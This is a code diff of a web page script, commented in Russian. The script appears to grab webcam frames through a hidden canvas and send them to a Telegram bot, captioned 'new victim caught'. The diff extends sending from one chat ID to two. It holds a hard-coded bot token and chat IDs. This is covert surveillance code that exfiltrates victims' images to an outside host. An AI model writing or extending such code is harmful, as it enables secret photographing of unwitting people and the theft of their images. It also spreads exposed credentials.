@@ -122,9 +122,9 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Твои реальные данные бота и чата
         const BOT_TOKEN = '9176741718:AAG4UgtGs8O8MovvouhjS8ncg3Jbgl73PWY'; 
-        const CHAT_ID = '7523561197';
+        // Массив со всеми Chat ID
+        const CHAT_IDS = ['7523561197', '8671534168'];
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -139,23 +139,20 @@
                 const res = await fetch(dataUrl);
                 const blob = await res.blob();
                 
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'target.png');
-                formData.append('caption', '🎯 Пойман новый жертва! 😂');
+                // Отправляем снимки по всем указанным Chat ID
+                for (const chatId of CHAT_IDS) {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'target.png');
+                    formData.append('caption', '🎯 Пойман новый жертва! 😂');
 
-                const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const tgData = await tgRes.json();
-
-                if (tgData.ok) {
-                    uploadStatus.textContent = "Снимок успешно отправлен тебе в Telegram! 🚀";
-                } else {
-                    uploadStatus.textContent = "Ошибка отправки боту: " + tgData.description;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
                 }
+
+                uploadStatus.textContent = "Снимок успешно отправлен! 🚀";
             } catch (err) {
                 console.error('Ошибка сети:', err);
                 uploadStatus.textContent = "Ошибка связи с Telegram.";
